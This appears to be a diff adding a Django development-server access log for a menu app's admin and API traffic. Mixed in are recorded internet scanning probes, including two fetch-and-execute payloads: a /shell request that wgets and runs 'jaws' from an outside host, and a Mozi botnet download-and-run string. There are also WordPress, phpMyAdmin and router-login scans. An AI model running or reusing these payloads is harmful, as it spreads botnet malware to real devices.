+[05/May/2022 12:35:00] "POST /menu/ HTTP/1.1" 200 107
+[05/May/2022 12:35:47] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:36:52] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:36:55] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:37:03] "GET /admin/menu/menu/ HTTP/1.1" 200 10103
+[05/May/2022 12:37:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:37:11] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:37:33] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:38:15] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:38:33] "GET /admin/menu/menu/7/change/ HTTP/1.1" 200 9857
+[05/May/2022 12:38:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:38:36] "GET /admin/menu/menu/ HTTP/1.1" 200 10103
+[05/May/2022 12:38:40] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:39:29] "POST /menu/ HTTP/1.1" 200 107
+[05/May/2022 12:40:55] "POST /menu/ HTTP/1.1" 200 107
+[05/May/2022 12:41:22] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:41:35] "POST /menu/ HTTP/1.1" 200 165
+[05/May/2022 12:41:45] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:41:59] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:42:00] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:42:18] "POST /menu/ HTTP/1.1" 200 116
+[05/May/2022 12:42:33] "POST /menu/ HTTP/1.1" 200 111
+[05/May/2022 12:42:43] "POST /menu/ HTTP/1.1" 200 116
+[05/May/2022 12:42:56] "POST /admin/menu/menu/ HTTP/1.1" 200 5136
+[05/May/2022 12:42:57] "POST /admin/menu/menu/ HTTP/1.1" 302 0
+[05/May/2022 12:42:57] "GET /admin/menu/menu/ HTTP/1.1" 200 9763
+[05/May/2022 12:42:57] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:43:10] "GET /admin/menu/menu/ HTTP/1.1" 200 9629
+[05/May/2022 12:43:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:43:10] "POST /menu/ HTTP/1.1" 200 151
+Not Found: /shell
+[05/May/2022 12:44:42] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[05/May/2022 12:51:37] "POST /menu/ HTTP/1.1" 200 116
+[05/May/2022 12:57:07] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:57:23] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:57:34] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:57:53] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 12:58:10] "POST /menu/ HTTP/1.1" 200 107
+[05/May/2022 12:59:21] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 12:59:21] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:59:25] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9790
+[05/May/2022 12:59:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 12:59:38] "GET /static/admin/img/calendar-icons.svg HTTP/1.1" 200 1094
+[05/May/2022 13:00:00] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 13:00:00] "GET /admin/menu/menu/ HTTP/1.1" 200 10315
+[05/May/2022 13:00:00] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:00:05] "GET /admin/menu/menu/8/change/ HTTP/1.1" 200 9803
+[05/May/2022 13:00:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:00:31] "POST /admin/menu/menu/8/change/ HTTP/1.1" 302 0
+[05/May/2022 13:00:31] "GET /admin/menu/menu/ HTTP/1.1" 200 10348
+[05/May/2022 13:00:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:00:38] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 13:00:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:01:02] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 13:01:02] "GET /admin/menu/menu/ HTTP/1.1" 200 10864
+[05/May/2022 13:01:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:01:05] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 13:01:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:01:25] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 13:01:25] "GET /admin/menu/menu/ HTTP/1.1" 200 11397
+[05/May/2022 13:01:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:01:33] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 13:01:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:02:31] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 13:02:31] "GET /admin/menu/menu/ HTTP/1.1" 200 11955
+[05/May/2022 13:02:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:02:35] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 13:02:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:02:52] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[05/May/2022 13:02:52] "GET /admin/menu/menu/ HTTP/1.1" 200 12470
+[05/May/2022 13:02:52] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 13:03:22] "POST /menu/ HTTP/1.1" 200 107
+[05/May/2022 13:03:31] "POST /menu/ HTTP/1.1" 200 177
+[05/May/2022 13:03:39] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 13:09:34] "POST /menu/ HTTP/1.1" 200 177
+[05/May/2022 13:10:17] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 13:12:20] "POST /menu/ HTTP/1.1" 200 116
+[05/May/2022 13:12:59] "POST /menu/ HTTP/1.1" 200 177
+[05/May/2022 13:13:11] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 13:13:32] "POST /menu/ HTTP/1.1" 200 116
+[05/May/2022 13:14:54] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[05/May/2022 13:33:21] "GET / HTTP/1.1" 404 2180
+Not Found: /config/getuser
+[05/May/2022 14:02:27] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[05/May/2022 14:28:11] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[05/May/2022 16:57:54] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[05/May/2022 18:25:22] "GET / HTTP/1.1" 404 2177
+[05/May/2022 18:28:29] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+[05/May/2022 18:28:29] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+Not Found: /boaform/admin/formLogin
+[05/May/2022 19:03:52] "POST /boaform/admin/formLogin HTTP/1.1" 404 2268
+Not Found: /
+[05/May/2022 19:55:22] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[05/May/2022 21:11:48] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[05/May/2022 21:57:09] "GET / HTTP/1.1" 404 2177
+Not Found: /http:/www.meow.org.uk/cgi-bin/env.pl
+[05/May/2022 22:35:22] "GET http://www.meow.org.uk/cgi-bin/env.pl HTTP/1.1" 404 1856
+[05/May/2022 23:26:59] "POST /menu/ HTTP/1.1" 200 28
+[05/May/2022 23:27:14] "POST /menu/ HTTP/1.1" 200 185
+Not Found: /
+[05/May/2022 23:31:29] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[05/May/2022 23:31:29] "GET / HTTP/1.1" 404 2177
+Not Found: /wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:30] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2276
+Not Found: /xmlrpc.php
+[05/May/2022 23:31:30] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2229
+Not Found: /
+[05/May/2022 23:31:30] "GET / HTTP/1.1" 404 2177
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:31] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /web/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:31] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:32] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2306
+Not Found: /website/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:32] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2300
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:33] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2285
+Not Found: /news/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:33] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /2018/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:34] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:34] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:34] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:35] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /test/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:35] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /media/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:36] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2294
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:36] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /site/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:37] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:37] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2288
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[05/May/2022 23:31:37] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2291
+[05/May/2022 23:42:33] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[05/May/2022 23:42:33] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[05/May/2022 23:42:33] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[05/May/2022 23:42:33] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[05/May/2022 23:44:59] "GET /admin/ HTTP/1.1" 302 0
+[05/May/2022 23:44:59] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[06/May/2022 00:27:13] "POST /menu/ HTTP/1.1" 200 209
+Not Found: /
+[06/May/2022 00:43:21] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[06/May/2022 01:38:49] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[06/May/2022 02:28:01] "GET / HTTP/1.1" 404 2177
+[06/May/2022 02:42:21] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[06/May/2022 02:54:53] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[06/May/2022 02:56:47] "GET / HTTP/1.1" 404 2180
+[06/May/2022 03:49:20] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[06/May/2022 03:58:25] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[06/May/2022 03:58:28] "GET / HTTP/1.1" 404 2180
+Not Found: /phpMyAdmin2/index.php
+[06/May/2022 04:57:54] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 2266
+[06/May/2022 05:01:19] "GET /admin/ HTTP/1.1" 200 6789
+[06/May/2022 05:01:19] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[06/May/2022 05:01:19] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[06/May/2022 05:01:19] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /admin/menu/menu/ HTTP/1.1" 200 12267
+[06/May/2022 05:01:20] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:01:20] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[06/May/2022 05:01:20] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:01:47] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:01:47] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[06/May/2022 05:01:47] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[06/May/2022 05:02:58] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:02:58] "GET /admin/menu/menu/ HTTP/1.1" 200 12998
+[06/May/2022 05:02:59] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:02:59] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 304 0
+[06/May/2022 05:03:03] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:03:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:12] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:03:12] "GET /admin/menu/menu/ HTTP/1.1" 200 13479
+[06/May/2022 05:03:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:15] "GET /admin/menu/menu/14/change/ HTTP/1.1" 200 9805
+[06/May/2022 05:03:15] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:25] "POST /admin/menu/menu/14/change/ HTTP/1.1" 302 0
+[06/May/2022 05:03:25] "GET /admin/menu/menu/ HTTP/1.1" 200 13520
+[06/May/2022 05:03:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:28] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:03:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:52] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:03:52] "GET /admin/menu/menu/ HTTP/1.1" 200 14059
+[06/May/2022 05:03:52] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:03:54] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:03:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:04:13] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:04:13] "GET /admin/menu/menu/ HTTP/1.1" 200 14571
+[06/May/2022 05:04:13] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:04:22] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:04:22] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:04:58] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:04:58] "GET /admin/menu/menu/ HTTP/1.1" 200 15112
+[06/May/2022 05:04:58] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:05:00] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:05:00] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:05:16] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:05:16] "GET /admin/menu/menu/ HTTP/1.1" 200 15636
+[06/May/2022 05:05:16] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:05:19] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:05:19] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:05:33] "GET /admin/menu/menu/ HTTP/1.1" 200 15433
+[06/May/2022 05:05:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:05:41] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:05:41] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:03] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:06:03] "GET /admin/menu/menu/ HTTP/1.1" 200 16175
+[06/May/2022 05:06:03] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:04] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:06:05] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:22] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:06:23] "GET /admin/menu/menu/ HTTP/1.1" 200 16687
+[06/May/2022 05:06:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:25] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:06:25] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:43] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:06:43] "GET /admin/menu/menu/ HTTP/1.1" 200 17240
+[06/May/2022 05:06:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:06:45] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:06:45] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:02] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:07:02] "GET /admin/menu/menu/ HTTP/1.1" 200 17761
+[06/May/2022 05:07:02] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:04] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:07:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:27] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:07:27] "GET /admin/menu/menu/ HTTP/1.1" 200 18293
+[06/May/2022 05:07:27] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:28] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:07:29] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:48] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:07:48] "GET /admin/menu/menu/ HTTP/1.1" 200 18832
+[06/May/2022 05:07:48] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:07:49] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:07:49] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:12] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:08:12] "GET /admin/menu/menu/ HTTP/1.1" 200 19368
+[06/May/2022 05:08:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:13] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:08:13] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:30] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:08:30] "GET /admin/menu/menu/ HTTP/1.1" 200 19883
+[06/May/2022 05:08:30] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:31] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:08:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:51] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:08:51] "GET /admin/menu/menu/ HTTP/1.1" 200 20415
+[06/May/2022 05:08:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:08:53] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:08:53] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:09:10] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:09:10] "GET /admin/menu/menu/ HTTP/1.1" 200 20950
+[06/May/2022 05:09:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:09:12] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:09:12] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:09:28] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:09:28] "GET /admin/menu/menu/ HTTP/1.1" 200 21465
+[06/May/2022 05:09:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:09:31] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:09:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:09:49] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:09:49] "GET /admin/menu/menu/ HTTP/1.1" 200 22012
+[06/May/2022 05:09:49] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:04] "POST /admin/menu/menu/ HTTP/1.1" 200 5689
+[06/May/2022 05:10:04] "GET /static/admin/js/cancel.js HTTP/1.1" 304 0
+[06/May/2022 05:10:06] "POST /admin/menu/menu/ HTTP/1.1" 302 0
+[06/May/2022 05:10:06] "GET /admin/menu/menu/ HTTP/1.1" 200 19488
+[06/May/2022 05:10:06] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:09] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:10:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:14] "GET /admin/menu/menu/ HTTP/1.1" 200 19353
+[06/May/2022 05:10:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:20] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:10:20] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:45] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:10:45] "GET /admin/menu/menu/ HTTP/1.1" 200 20083
+[06/May/2022 05:10:45] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:10:47] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:10:47] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:12:39] "GET /admin/menu/menu/ HTTP/1.1" 200 19880
+[06/May/2022 05:12:39] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:12:43] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:12:43] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+Not Found: /
+[06/May/2022 05:13:07] "GET / HTTP/1.1" 404 2177
+[06/May/2022 05:13:09] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:13:09] "GET /admin/menu/menu/ HTTP/1.1" 200 20621
+[06/May/2022 05:13:09] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:13:10] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:13:10] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:13:31] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[06/May/2022 05:13:31] "GET /admin/menu/menu/ HTTP/1.1" 200 21148
+[06/May/2022 05:13:31] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:13:33] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[06/May/2022 05:13:33] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[06/May/2022 05:13:54] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
